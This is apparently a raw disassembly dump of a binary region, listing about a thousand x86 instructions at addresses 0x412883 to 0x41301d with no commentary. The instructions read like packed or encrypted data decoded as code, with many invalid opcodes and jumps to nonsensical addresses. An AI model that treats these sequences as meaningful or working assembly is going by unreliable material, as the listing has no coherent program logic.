  412883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412884:	lea    edx,[edi]
  412886:	pop    esp
  412887:	pop    ds
  412888:	pop    eax
  412889:	pusha  
  41288a:	fs js  0x412888
  41288d:	(bad)  
  41288e:	(bad)  
  41288f:	xchg   esi,eax
  412890:	xor    BYTE PTR [esi+0x477d42d8],dl
  412896:	sar    DWORD PTR [edx+0x49],1
  412899:	jl     0x4128bc
  41289b:	loope  0x412847
  41289d:	icebp  
  41289e:	or     ah,BYTE PTR [eax+edi*8-0x74]
  4128a2:	cld    
  4128a3:	xlat   BYTE PTR ds:[ebx]
  4128a4:	iret   
  4128a5:	push   esi
  4128a6:	test   esp,0x8765c863
  4128ac:	mov    WORD PTR [ebp+0x74],gs
  4128af:	shl    BYTE PTR ds:[edx+0x2e1df8d5],0x6d
  4128b7:	mov    edi,0x44a42ba7
  4128bc:	imul   ecx,edx,0x52
  4128bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128c1:	mov    bh,0xc1
  4128c3:	cmp    DWORD PTR [esi+0x7dbbd94f],esp
  4128c9:	xchg   esi,eax
  4128ca:	ret    0xaf3c
  4128cd:	and    eax,0x7549f856
  4128d2:	imul   eax,DWORD PTR [ecx-0x42],0x5cdd2da4
  4128d9:	int3   
  4128da:	cmp    edx,edx
  4128dc:	mov    edi,0x770049ba
  4128e1:	push   ds
  4128e2:	xchg   esi,eax
  4128e3:	adc    esp,DWORD PTR [ebp-0x7a]
  4128e6:	out    0xc3,al
  4128e8:	inc    edx
  4128e9:	lahf   
  4128ea:	push   edi
  4128eb:	fmul   DWORD PTR [ebp-0x24]
  4128ee:	add    eax,DWORD PTR [edx]
  4128f0:	jle    0x4128f0
  4128f2:	les    edx,FWORD PTR [edx+0x23]
  4128f5:	xor    esp,esi
  4128f7:	jmp    0x2933d688
  4128fc:	nop
  4128fd:	push   ss
  4128fe:	je     0x412895
  412900:	inc    eax
  412901:	push   es
  412902:	cmp    DWORD PTR [edi+0x30c9224a],0x230ddf68
  41290c:	sbb    edx,DWORD PTR [ebx+0x57012b86]
  412912:	xor    al,0x6f
  412914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412915:	and    ebx,DWORD PTR [ecx+0x22]
  412918:	aas    
  412919:	jnp    0x41296c
  41291b:	push   ebx
  41291c:	add    eax,0x63503b44
  412921:	je     0x4128c6
  412923:	mov    bh,0x5f
  412925:	inc    edx
  412926:	ds jl  0x41294c
  412929:	addr16 push eax
  41292b:	popa   
  41292c:	ins    BYTE PTR es:[edi],dx
  41292d:	add    cl,dl
  41292f:	and    al,BYTE PTR [esi]
  412931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412932:	loop   0x41292b
  412934:	das    
  412935:	adc    DWORD PTR [ecx],ecx
  412937:	bnd jmp 0x412965
  41293a:	cmp    BYTE PTR [esi-0x47],cl
  41293d:	push   ds
  41293e:	xor    al,0x7f
  412940:	jb     0x412961
  412942:	imul   ecx,DWORD PTR [eax-0x8],0x5a25ebe4
  412949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41294a:	push   edx
  41294b:	inc    ebx
  41294c:	adc    eax,0xcbc4ef7
  412951:	or     edi,DWORD PTR [eax+0x4e]
  412954:	fistp  QWORD PTR [edi+0x13]
  412957:	ins    BYTE PTR es:[edi],dx
  412958:	pop    esp
  412959:	mov    al,BYTE PTR [esi]
  41295b:	test   DWORD PTR [edi+0x2c],edx
  41295e:	int3   
  41295f:	clc    
  412960:	lods   eax,DWORD PTR ds:[esi]
  412961:	jno    0x4128fa
  412963:	(bad)  
  412964:	lock push esi
  412966:	jb     0x4129e3
  412968:	xchg   edi,eax
  412969:	gs push ebp
  41296b:	fiadd  DWORD PTR [edx+0x2850ab80]
  412971:	xchg   ebx,eax
  412972:	lock jno 0x4129ed
  412975:	aaa    
  412976:	mov    bl,0xc9
  412978:	jg     0x412981
  41297a:	out    0x43,al
  41297c:	push   esp
  41297d:	fisub  WORD PTR [esi]
  41297f:	push   cs
  412980:	push   ebp
  412981:	in     al,0x98
  412983:	cld    
  412984:	sar    DWORD PTR [ebx-0x6c],1
  412987:	shld   DWORD PTR [edx+eax*8],esp,0x5
  41298c:	cmp    eax,0x953f1781
  412991:	cli    
  412992:	pop    ecx
  412993:	fld    DWORD PTR [ebp-0x3694d6f1]
  412999:	pushf  
  41299a:	jecxz  0x41299c
  41299c:	jl     0x4129ae
  41299e:	lods   al,BYTE PTR ds:[esi]
  41299f:	ins    DWORD PTR es:[edi],dx
  4129a0:	sar    DWORD PTR [esi],1
  4129a2:	mov    eax,ds:0xcbb3f587
  4129a7:	loopne 0x412968
  4129a9:	mov    eax,ds:0x62ce4112
  4129ae:	jl     0x4129f0
  4129b0:	mov    ebp,0x267a91ad
  4129b5:	ss cmp eax,0xbfd26b0e
  4129bb:	mov    dl,0xa0
  4129bd:	fld    st(2)
  4129bf:	js     0x412972
  4129c1:	js     0x412a41
  4129c3:	lock call 0x8f71897c
  4129c9:	int3   
  4129ca:	loope  0x4129c1
  4129cc:	sbb    dl,cl
  4129ce:	pop    es
  4129cf:	data16 sub BYTE PTR [ecx-0x6d078392],al
  4129d6:	mov    BYTE PTR [ebp+0x63d30ae5],0xee
  4129dd:	shl    edi,1
  4129df:	xchg   esi,eax
  4129e0:	cwde   
  4129e1:	ins    DWORD PTR es:[edi],dx
  4129e2:	pop    ebp
  4129e3:	mov    bl,0x8d
  4129e5:	shl    BYTE PTR [ebx-0x23],0xf
  4129e9:	push   es
  4129ea:	aaa    
  4129eb:	aas    
  4129ec:	inc    esi
  4129ed:	push   ebp
  4129ee:	bound  ecx,QWORD PTR ds:0x43878861
  4129f4:	mov    esi,0x6f2a3df6
  4129f9:	mov    ebx,0xc1c141b8
  4129fe:	push   esi
  4129ff:	clc    
  412a00:	inc    esp
  412a01:	sbb    BYTE PTR [esi],0x44
  412a04:	test   eax,0x9871c733
  412a09:	xchg   ecx,eax
  412a0a:	hlt    
  412a0b:	rcl    DWORD PTR [esi+0x1d],cl
  412a0e:	adc    ecx,ebx
  412a10:	pop    esp
  412a11:	sub    esi,DWORD PTR [ecx+0x7c]
  412a14:	add    DWORD PTR [ebx],ebx
  412a16:	pop    esi
  412a17:	lods   eax,DWORD PTR ds:[esi]
  412a18:	xchg   BYTE PTR [ebx+0x17e7e601],dh
  412a1e:	retf   0xfc22
  412a21:	lods   al,BYTE PTR ds:[esi]
  412a22:	xor    DWORD PTR [edx],edx
  412a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a25:	repz push esi
  412a27:	pushf  
  412a28:	hlt    
  412a29:	pop    ds
  412a2a:	daa    
  412a2b:	ret    0x97e1
  412a2e:	pop    ebp
  412a2f:	ret    
  412a30:	cmc    
  412a31:	std    
  412a32:	pop    edx
  412a33:	sbb    ah,bh
  412a35:	mov    bh,0xf3
  412a37:	xor    eax,0x9cd4a5a7
  412a3c:	and    edx,DWORD PTR [edx]
  412a3e:	jp     0x412a9a
  412a40:	or     al,0x8e
  412a42:	in     al,dx
  412a43:	xor    eax,0xdb74102e
  412a48:	retf   
  412a49:	stos   BYTE PTR es:[edi],al
  412a4a:	test   BYTE PTR [edx+0x37],0xde
  412a4e:	jge    0x412ab3
  412a50:	in     al,0x5b
  412a52:	in     eax,0xf0
  412a54:	pop    edx
  412a55:	leave  
  412a56:	mov    DWORD PTR [eax-0x13],esi
  412a59:	outs   dx,DWORD PTR ds:[esi]
  412a5a:	inc    esp
  412a5b:	add    BYTE PTR [eax-0x16e907ac],al
  412a61:	je     0x4129fb
  412a63:	mov    ah,0x99
  412a65:	or     al,0x40
  412a67:	mov    ebp,0xc8d81b21
  412a6c:	fwait
  412a6d:	pop    ecx
  412a6e:	popa   
  412a6f:	fistp  WORD PTR [eax]
  412a71:	(bad)
  412a74:	pandn  mm2,QWORD PTR [ebx-0x42]
  412a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a79:	xchg   edx,eax
  412a7a:	call   FWORD PTR [eax+0x26]
  412a7d:	and    BYTE PTR [ebx-0x4d2b1ded],al
  412a83:	pop    eax
  412a84:	lea    edx,[edi-0x49]
  412a87:	cmp    DWORD PTR [ecx],ebp
  412a89:	add    al,0xd
  412a8b:	mov    eax,ds:0x2f265c6a
  412a90:	push   ss
  412a91:	lods   eax,DWORD PTR ds:[esi]
  412a92:	xor    edi,DWORD PTR [ecx+eax*4-0x65]
  412a96:	pop    edx
  412a97:	imul   BYTE PTR [esi+0x661c670a]
  412a9d:	pop    ebp
  412a9e:	(bad)  
  412a9f:	rcr    DWORD PTR [ebp-0x53],0xd1
  412aa3:	jmp    0x137cd7e3
  412aa8:	add    DWORD PTR [edx],0xb9175eac
  412aae:	repnz xor al,0xf7
  412ab1:	aas    
  412ab2:	sub    BYTE PTR [esi+0x79276ca1],ch
  412ab8:	repnz mov dl,0x6
  412abb:	xchg   ebp,eax
  412abc:	mov    eax,0x1390e75f
  412ac1:	loope  0x412af5
  412ac3:	pusha  
  412ac4:	sbb    al,0x50
  412ac6:	fwait
  412ac7:	in     eax,0x6e
  412ac9:	push   ebp
  412aca:	rcl    DWORD PTR [edx+0x25],0xa7
  412ace:	retf   0x3aff
  412ad1:	ds jecxz 0x412af6
  412ad4:	adc    al,0xb3
  412ad6:	in     eax,0xb9
  412ad8:	push   0x71c740bd
  412add:	pushf  
  412ade:	ds ins BYTE PTR es:[edi],dx
  412ae0:	cdq    
  412ae1:	std    
  412ae2:	mov    ch,0x83
  412ae4:	(bad)  
  412ae5:	repz test BYTE PTR [eax-0x52],dl
  412ae9:	pusha  
  412aea:	mov    BYTE PTR [ecx],cl
  412aec:	(bad)  
  412aee:	jb     0x412a7d
  412af0:	mov    al,0x94
  412af2:	int    0x7d
  412af4:	xchg   ebp,eax
  412af5:	mov    al,ds:0x40dc5ea2
  412afa:	es jo  0x412aaf
  412afd:	(bad)  
  412afe:	mov    ebp,0x10b76fbf
  412b03:	inc    eax
  412b04:	outs   dx,BYTE PTR ds:[esi]
  412b05:	push   edx
  412b06:	inc    ebx
  412b07:	pop    edx
  412b08:	cwde   
  412b09:	test   al,0xf7
  412b0b:	fwait
  412b0c:	rcl    BYTE PTR [edi],1
  412b0e:	pushf  
  412b0f:	popw   ds
  412b11:	jp     0x412aa5
  412b13:	push   eax
  412b14:	jg     0x412b45
  412b16:	add    dh,bl
  412b18:	fwait
  412b19:	or     edx,DWORD PTR [ecx+0x2c]
  412b1c:	dec    esp
  412b1d:	leave  
  412b1e:	shr    DWORD PTR [edi+0x1359a19e],1
  412b24:	mov    bl,0x42
  412b26:	mov    eax,ds:0x9a19266c
  412b2b:	push   es
  412b2c:	add    bl,BYTE PTR [ebp+0x87e64b4]
  412b32:	push   edi
  412b33:	jo     0x412b8d
  412b35:	enter  0xf72c,0xe4
  412b39:	mov    ah,0x51
  412b3b:	(bad)  
  412b3c:	pop    ecx
  412b3d:	jno    0x412b2f
  412b3f:	xchg   ecx,eax
  412b40:	mov    ah,0x14
  412b42:	inc    eax
  412b43:	ret    
  412b44:	mov    edi,0x63681ac0
  412b49:	xchg   esi,eax
  412b4a:	dec    eax
  412b4b:	fdiv   QWORD PTR [edi-0x2fd08adb]
  412b51:	in     eax,0x7c
  412b53:	fnstcw WORD PTR [edi+0x2e]
  412b56:	scas   eax,DWORD PTR es:[edi]
  412b57:	dec    ecx
  412b58:	cmc    
  412b59:	push   eax
  412b5a:	mov    BYTE PTR [edx],bl
  412b5c:	das    
  412b5d:	fcmovne st,st(5)
  412b5f:	stc    
  412b60:	shr    ah,1
  412b62:	and    al,0x60
  412b64:	and    esi,0xffffffd8
  412b67:	ins    DWORD PTR es:[edi],dx
  412b68:	es aam 0xe7
  412b6b:	sub    BYTE PTR [edi],bl
  412b6d:	cld    
  412b6e:	xchg   esi,eax
  412b6f:	cmp    ebp,DWORD PTR [eax+0x6cd47005]
  412b75:	pusha  
  412b76:	inc    esp
  412b77:	mov    bh,0x1f
  412b79:	fcomip st,st(2)
  412b7b:	jo     0x412be9
  412b7d:	xchg   ecx,eax
  412b7e:	scas   eax,DWORD PTR es:[edi]
  412b7f:	sbb    bh,0x45
  412b82:	ss jmp 0x2bcdd70f
  412b88:	inc    ecx
  412b89:	mov    cl,0x47
  412b8b:	lds    ebp,FWORD PTR [ecx+edx*8]
  412b8e:	popa   
  412b8f:	das    
  412b90:	stos   DWORD PTR es:[edi],eax
  412b91:	push   edx
  412b92:	js     0x412baf
  412b94:	fucomp st(1)
  412b96:	les    ebx,FWORD PTR [eax+0xc8e4059]
  412b9c:	or     edi,ecx
  412b9e:	inc    ebx
  412b9f:	jns    0x412c05
  412ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ba2:	rcr    DWORD PTR [ebx-0x26],1
  412ba5:	sub    bh,ah
  412ba7:	fs loopne 0x412b4b
  412baa:	push   eax
  412bab:	xor    eax,0x1599d38a
  412bb0:	fistp  WORD PTR [ebp-0x77]
  412bb3:	jnp    0x412c32
  412bb5:	ret    0x6a52
  412bb8:	ja     0x412b91
  412bba:	enter  0x34dc,0x3
  412bbe:	adc    al,0xa
  412bc0:	xor    eax,0x1451112c
  412bc5:	or     ebx,DWORD PTR [ecx+edx*8-0x42ca37a]
  412bcc:	xchg   ebx,eax
  412bcd:	popf   
  412bce:	adc    esi,DWORD PTR [esi+0x56]
  412bd1:	mov    ebx,0x3cef654e
  412bd6:	cmc    
  412bd7:	jl     0x412bc2
  412bd9:	xchg   ebx,eax
  412bda:	and    ah,BYTE PTR [edi-0x6b]
  412bdd:	jg     0x412b5f
  412bdf:	pop    ebp
  412be1:	pop    ebp
  412be2:	mov    cl,0x6e
  412be4:	inc    ecx
  412be5:	cmc    
  412be6:	xor    DWORD PTR [edx-0x26],eax
  412be9:	mov    WORD PTR [ebx+0x32],gs
  412bec:	and    DWORD PTR [ebx+edx*2+0x69cdf16a],edx
  412bf3:	dec    ebp
  412bf4:	cmp    BYTE PTR [ecx],dl
  412bf6:	sbb    BYTE PTR [edi],dh
  412bf8:	pop    ss
  412bf9:	out    dx,eax
  412bfa:	pop    ds
  412bfb:	test   al,0xdc
  412bfd:	sub    DWORD PTR [edx-0x6a6e5d1e],ecx
  412c03:	popa   
  412c04:	popf   
  412c05:	pop    esp
  412c06:	jmp    0x9017:0x518f965a
  412c0d:	clc    
  412c0e:	push   ss
  412c0f:	or     eax,0x9153ad71
  412c14:	inc    esp
  412c15:	dec    ebp
  412c16:	fdivp  st(4),st
  412c18:	xor    DWORD PTR [ebx+0x5],edi
  412c1b:	sbb    al,0xd7
  412c1d:	jae    0x412c09
  412c1f:	les    ecx,FWORD PTR [ecx]
  412c21:	mov    ebp,0xde4e587b
  412c26:	adc    al,0x66
  412c28:	jbe    0x412c11
  412c2a:	test   eax,0xe702affe
  412c2f:	lods   al,BYTE PTR ds:[esi]
  412c30:	push   ebx
  412c31:	scas   al,BYTE PTR es:[edi]
  412c32:	mov    bh,0xca
  412c34:	xor    BYTE PTR [eax+0x39],dh
  412c37:	cld    
  412c38:	pushf  
  412c39:	mov    dh,0x42
  412c3b:	cdq    
  412c3c:	iret   
  412c3d:	mov    dl,0xc5
  412c3f:	enter  0xc707,0x57
  412c43:	pop    ebx
  412c44:	in     al,0x18
  412c46:	shr    ah,1
  412c48:	in     al,0x5
  412c4a:	and    eax,0x4a2cbe3f
  412c4f:	inc    eax
  412c50:	jmp    0x412c55
  412c52:	hlt    
  412c53:	sbb    eax,0xb9791158
  412c58:	int3   
  412c59:	jg     0x412c9d
  412c5b:	in     al,0xd6
  412c5d:	es dec esi
  412c5f:	shl    DWORD PTR [bp+0x56c6],1
  412c64:	rcl    DWORD PTR [ecx-0x5bc8259d],cl
  412c6a:	outs   dx,BYTE PTR ds:[esi]
  412c6b:	sbb    BYTE PTR [edi+0x32],0xc8
  412c6f:	(bad)  [edx]
  412c71:	cmp    BYTE PTR [ebx],0x36
  412c74:	sub    ebp,edx
  412c76:	jo     0x412c51
  412c78:	retf   0x54b1
  412c7b:	adc    al,0x6e
  412c7d:	sti    
  412c7e:	repz fnstcw WORD PTR [edi-0x7e]
  412c82:	les    ebx,FWORD PTR [esi]
  412c84:	shr    BYTE PTR [ebx+0x54],cl
  412c87:	mov    edi,0x261d8e49
  412c8c:	jne    0x412c99
  412c8e:	data16 (bad) 
  412c90:	jl     0x412ce2
  412c92:	jle    0x412c9e
  412c94:	push   edi
  412c95:	sbb    ah,BYTE PTR [esi+0x19f416cc]
  412c9b:	or     BYTE PTR [ebp-0x5f1e21a6],dh
  412ca1:	ss jmp 0xcb4a:0x5e9d6a4b
  412ca9:	(bad)  
  412caa:	cmp    DWORD PTR [ebp+0x162dc3b],eax
  412cb0:	mov    bl,0xec
  412cb2:	test   BYTE PTR [esi-0x43863e97],dh
  412cb8:	jl     0x412c95
  412cba:	xor    dh,BYTE PTR [esi-0x42]
  412cbd:	jl     0x412c94
  412cbf:	xor    eax,0x3201c17d
  412cc4:	inc    ebx
  412cc5:	ror    BYTE PTR [eax+0x16],1
  412cc8:	dec    ebp
  412cc9:	inc    ebx
  412cca:	into   
  412ccb:	popa   
  412ccc:	lahf   
  412ccd:	mov    eax,DWORD PTR [edx]
  412ccf:	mov    ebx,0xcd6a03b4
  412cd4:	cmp    BYTE PTR [edx],bl
  412cd6:	inc    esp
  412cd7:	mov    bh,0x4b
  412cd9:	sahf   
  412cda:	hlt    
  412cdb:	add    eax,0x667c712e
  412ce0:	ret    
  412ce1:	dec    edx
  412ce2:	adc    ch,0xcc
  412ce5:	lock add al,0xe5
  412ce8:	mov    ecx,0x86f818a9
  412ced:	arpl   di,bx
  412cef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cf0:	push   0x37
  412cf2:	iret   
  412cf3:	cmc    
  412cf4:	pop    ebx
  412cf5:	nop
  412cf6:	jb     0x412cbe
  412cf8:	push   0xf3d4abf5
  412cfd:	jb     0x412ce9
  412cff:	adc    BYTE PTR [eax-0x19bc9ab],ah
  412d05:	aad    0xd4
  412d07:	std    
  412d08:	xchg   ebp,eax
  412d09:	xchg   edi,eax
  412d0a:	add    dl,BYTE PTR [ecx-0x9]
  412d0d:	adc    al,0xcd
  412d0f:	mov    edi,0x92945fb4
  412d14:	mov    BYTE PTR [edx],ch
  412d16:	sbb    ebp,esp
  412d18:	mov    WORD PTR [ebx-0x7d458924],fs
  412d1e:	imul   eax,DWORD PTR [edx+esi*4+0x2d],0x5c
  412d23:	or     ah,bl
  412d25:	sub    ch,BYTE PTR [edx]
  412d27:	inc    esi
  412d28:	xlat   BYTE PTR ds:[ebx]
  412d29:	clc    
  412d2a:	push   es
  412d2b:	fsubp  st(6),st
  412d2d:	add    ch,BYTE PTR [ebx+0x6d]
  412d30:	pop    es
  412d31:	(bad)  
  412d32:	int    0xd3
  412d34:	mov    esp,0x982e76d1
  412d39:	jp     0x412da0
  412d3b:	pop    edi
  412d3c:	inc    esp
  412d3d:	(bad)  
  412d3e:	mov    BYTE PTR [esi+0x33],bh
  412d41:	loopne 0x412d81
  412d43:	sar    BYTE PTR [esi+0x7f],0xbb
  412d47:	sbb    eax,0xd121adff
  412d4c:	ss push 0xdd74e48d
  412d52:	fidiv  WORD PTR [eax+0x224d048d]
  412d58:	xchg   ebp,eax
  412d59:	inc    esi
  412d5a:	ds popf 
  412d5c:	aad    0xae
  412d5e:	jnp    0x412d1e
  412d60:	jmp    0x23a8:0xa147f1d7
  412d67:	cdq    
  412d68:	test   eax,0xe89a6ca9
  412d6d:	aas    
  412d6e:	mov    ds:0x15e18827,al
  412d73:	jns    0x412d6a
  412d75:	call   0xc561:0x8761c43c
  412d7c:	iret   
  412d7d:	test   eax,0x6d39ea5a
  412d82:	popa   
  412d83:	aas    
  412d84:	and    DWORD PTR [ebx-0x52b914ec],edx
  412d8a:	dec    ebx
  412d8b:	xchg   esp,eax
  412d8c:	xchg   edx,eax
  412d8d:	adc    bh,dl
  412d8f:	add    al,0x37
  412d91:	int    0x77
  412d93:	cwde   
  412d94:	cmp    eax,0x4f0309c3
  412d99:	daa    
  412d9a:	sbb    BYTE PTR [eax],bl
  412d9c:	addr16 out 0x3d,eax
  412d9f:	sti    
  412da0:	in     eax,0x45
  412da2:	rol    DWORD PTR [ecx-0x41],0x6a
  412da6:	dec    BYTE PTR [eax+ebp*8+0x28]
  412daa:	int    0xe2
  412dac:	sar    esp,1
  412dae:	fstp   DWORD PTR [edi+0xbb65d29]
  412db4:	call   0xb774643d
  412db9:	fwait
  412dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dbb:	inc    eax
  412dbc:	xchg   edx,eax
  412dbd:	xchg   esi,eax
  412dbe:	fsubrp st(2),st
  412dc0:	pop    edx
  412dc1:	je     0x412e12
  412dc3:	outs   dx,BYTE PTR ds:[esi]
  412dc4:	mul    BYTE PTR [ebp+ebp*2-0x131834de]
  412dcb:	imul   edx,DWORD PTR [edx],0xa58015f6
  412dd1:	mov    dl,BYTE PTR gs:[ecx]
  412dd4:	inc    esi
  412dd5:	add    al,0x97
  412dd7:	pop    ecx
  412dd9:	ja     0x412e13
  412ddb:	lock add BYTE PTR [esi],bh
  412dde:	jge    0x412dec
  412de0:	pushf  
  412de1:	jg     0x412e4e
  412de3:	cmp    eax,0xbf98aaf
  412de8:	dec    ecx
  412de9:	in     al,0x10
  412deb:	mov    ds:0x126235f8,eax
  412df0:	sbb    al,BYTE PTR [ebp-0xc]
  412df3:	push   0xf095fc92
  412df8:	fs pop edi
  412dfa:	cmc    
  412dfb:	xor    eax,0xde6599e9
  412e00:	mov    esi,0xff56fce0
  412e05:	xchg   al,bh
  412e07:	sbb    eax,0x5253c476
  412e0c:	ja     0x412df6
  412e0e:	enter  0x54bd,0x30
  412e12:	pop    esi
  412e13:	test   DWORD PTR [ecx+0x39],0x7ee03dc
  412e1a:	dec    ebp
  412e1b:	push   cs
  412e1c:	sbb    eax,0x999949b0
  412e21:	cmc    
  412e22:	(bad)  
  412e23:	mov    ebp,0xcec903de
  412e28:	push   esi
  412e29:	fs sar dh,cl
  412e2c:	mov    dh,bl
  412e2e:	fnsave [ecx+0x6c97f587]
  412e34:	lods   eax,DWORD PTR es:[esi]
  412e36:	mov    eax,ds:0xf51f87d1
  412e3b:	mov    ds:0x6f258b67,eax
  412e40:	push   0xffffffca
  412e42:	jns    0x412e9a
  412e44:	lea    ebp,[ebp+0xa]
  412e47:	dec    edi
  412e48:	fldcw  WORD PTR [ebx]
  412e4a:	dec    ebp
  412e4b:	(bad)  
  412e4c:	pushf  
  412e4d:	fcmovbe st,st(6)
  412e4f:	or     BYTE PTR ds:0xd22e5906,dh
  412e55:	loope  0x412e7e
  412e57:	sbb    bh,dl
  412e59:	test   eax,0xf3adb1d6
  412e5e:	inc    eax
  412e5f:	cmp    edx,DWORD PTR [ebp-0x74]
  412e62:	stos   DWORD PTR es:[edi],eax
  412e63:	das    
  412e64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e65:	push   esi
  412e66:	daa    
  412e67:	xchg   edi,eax
  412e68:	addr16 mov al,ds:0x82b9
  412e6d:	or     ebp,esi
  412e6f:	adc    DWORD PTR [eax-0x28d1c114],0xc6a9632f
  412e79:	inc    ebx
  412e7a:	cmp    DWORD PTR [ecx-0x7a],ebx
  412e7d:	mov    ds:0x14fa8774,al
  412e82:	mov    ebp,0x39b27820
  412e87:	ss retf 0xdc12
  412e8b:	pop    edx
  412e8c:	data16 jmp 0x412ea6
  412e8f:	xlat   BYTE PTR es:[ebx]
  412e91:	cli    
  412e92:	outs   dx,DWORD PTR ds:[esi]
  412e93:	push   0xffffffa1
  412e95:	cdq    
  412e96:	iret   
  412e97:	dec    ecx
  412e98:	and    al,0xcd
  412e9a:	stos   DWORD PTR es:[edi],eax
  412e9b:	fst    QWORD PTR [edi]
  412e9d:	inc    edx
  412e9e:	fdiv   QWORD PTR [esi+0x6b7ccb43]
  412ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ea5:	mov    ch,0x66
  412ea7:	inc    edi
  412ea8:	mov    BYTE PTR [esi],cl
  412eaa:	sub    edi,DWORD PTR [ecx+eax*2]
  412ead:	dec    edx
  412eae:	data16 cmp al,0x9b
  412eb1:	dec    ebp
  412eb2:	xor    bl,BYTE PTR [edi+0x25]
  412eb5:	jmp    0x412eab
  412eb7:	fiadd  WORD PTR [ebx+0x43]
  412eba:	mov    DWORD PTR [ecx+0x5957f5c0],edi
  412ec0:	xrelease xchg DWORD PTR [ebx],edx
  412ec3:	add    DWORD PTR [eax],ebx
  412ec5:	pop    ebx
  412ec6:	jmp    0x412e62
  412ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ec9:	mov    ebp,DWORD PTR [eax+0x7d338418]
  412ecf:	in     al,0xa5
  412ed1:	jl     0x412f3b
  412ed3:	mov    edi,0xdaa90493
  412ed8:	jg     0x412f57
  412eda:	test   eax,0xdb2f7c37
  412edf:	loopne 0x412eb9
  412ee1:	es in  eax,0xa5
  412ee4:	in     eax,dx
  412ee5:	enter  0xcc96,0x46
  412ee9:	rol    DWORD PTR ds:0x1865e21e,cl
  412eef:	jno    0x412f20
  412ef1:	mov    ecx,0x5a2be3f5
  412ef6:	jge    0x412e8e
  412ef8:	pop    es
  412ef9:	push   ebx
  412efa:	call   0x4923:0x8bc23396
  412f01:	inc    ecx
  412f02:	fsubr  st,st(5)
  412f04:	rcl    bl,cl
  412f06:	push   esp
  412f07:	aaa    
  412f08:	add    DWORD PTR [ebp+edx*4+0x39],ebp
  412f0c:	pop    es
  412f0d:	sub    al,0xd1
  412f0f:	sub    eax,0xb5f0da5d
  412f14:	xor    esi,DWORD PTR [esi-0x56]
  412f17:	pop    ds
  412f18:	inc    eax
  412f19:	mov    al,ds:0xdec3838c
  412f1e:	push   0xffffff87
  412f20:	jp     0x412f2e
  412f22:	ror    DWORD PTR [eax+0x1e8d4f6c],cl
  412f28:	sub    al,0x64
  412f2a:	fild   DWORD PTR [edx+0x48cccbf2]
  412f30:	mov    dh,bl
  412f32:	inc    ecx
  412f33:	dec    edx
  412f34:	cmp    eax,0xfe28cbff
  412f39:	inc    esi
  412f3a:	push   ebp
  412f3b:	add    DWORD PTR [ebx],ebx
  412f3d:	ds push es
  412f3f:	daa    
  412f40:	(bad)  
  412f41:	jbe    0x412f40
  412f43:	imul   ecx,DWORD PTR ds:0x6a710f94,0x94787605
  412f4d:	out    dx,al
  412f4e:	push   es
  412f4f:	xor    DWORD PTR [edx],edi
  412f51:	dec    eax
  412f52:	xor    al,0x9f
  412f54:	or     ah,BYTE PTR [ebx+0x71]
  412f57:	and    edi,DWORD PTR [eax]
  412f59:	jo     0x412f1e
  412f5b:	push   ebx
  412f5c:	call   0xd61c7edf
  412f61:	cwde   
  412f62:	jmp    DWORD PTR [eax+0x4335f173]
  412f68:	cmp    al,0x2
  412f6a:	loope  0x412f4d
  412f6c:	ja     0x412f5d
  412f6e:	stos   BYTE PTR es:[edi],al
  412f6f:	add    BYTE PTR ss:[eax+0x1e4c63de],0xa3
  412f77:	push   0xb8992c9d
  412f7c:	xchg   ecx,eax
  412f7d:	mov    ebx,DWORD PTR [esi]
  412f7f:	ror    DWORD PTR [ecx+ebp*2-0x47cb8071],1
  412f86:	lds    ecx,FWORD PTR [esi-0x49d8ffbe]
  412f8c:	cli    
  412f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f8e:	jp     0x412fe8
  412f90:	movaps xmm1,XMMWORD PTR ds:0x9ae1c065
  412f97:	mov    dl,0x8a
  412f99:	ret    0x4ac0
  412f9c:	jle    0x412f2a
  412f9e:	push   cs
  412f9f:	ror    BYTE PTR [edi+0x2a63892a],cl
  412fa5:	xlat   BYTE PTR ds:[ebx]
  412fa6:	addr16 mov edx,0xfdf575b2
  412fac:	push   edx
  412fad:	leave  
  412fae:	(bad)  [ecx+0x4b5ba0d1]
  412fb4:	mov    DWORD PTR [esi-0x11],ebx
  412fb7:	pushf  
  412fb8:	push   es
  412fb9:	mov    dl,0x13
  412fbb:	outs   dx,DWORD PTR ds:[esi]
  412fbc:	frstor [ebx]
  412fbe:	sar    BYTE PTR [ecx],1
  412fc0:	xchg   esp,eax
  412fc1:	ss popa 
  412fc3:	mov    edx,gs
  412fc5:	mov    al,0xdc
  412fc7:	lea    ebx,[eax+0x72032d86]
  412fcd:	push   edx
  412fce:	mul    DWORD PTR [edx+ecx*2-0x9]
  412fd2:	push   edi
  412fd3:	fadd   st,st(4)
  412fd5:	pop    es
  412fd6:	inc    esp
  412fd7:	inc    eax
  412fd8:	pop    esp
  412fd9:	lods   eax,DWORD PTR ds:[esi]
  412fda:	outs   dx,DWORD PTR ds:[esi]
  412fdc:	jmp    0xe4f:0x528c3e65
  412fe3:	outs   dx,BYTE PTR ds:[esi]
  412fe4:	cli    
  412fe5:	inc    eax
  412fe6:	bnd jns 0x412ffc
  412fe9:	inc    ebx
  412fea:	push   eax
  412feb:	iret   
  412fec:	add    eax,0x218d705f
  412ff1:	ins    DWORD PTR es:[edi],dx
  412ff2:	add    eax,0xd0fd36b1
  412ff7:	mov    eax,ds:0x2037973a
  412ffc:	mov    dl,0x19
  412ffe:	inc    DWORD PTR ds:0xbcb6694a
  413004:	je     0x413020
  413006:	repz inc ebx
  413008:	cmp    BYTE PTR [edx],0x68
  41300b:	and    al,0x4f
  41300d:	sbb    DWORD PTR [ecx],esi
  41300f:	call   0x308b3d82
  413014:	inc    eax
  413015:	imul   esi,DWORD PTR [esi],0x48cb830f
  41301b:	or     al,0xd3
  41301d:	xor    eax,0x56d421e5
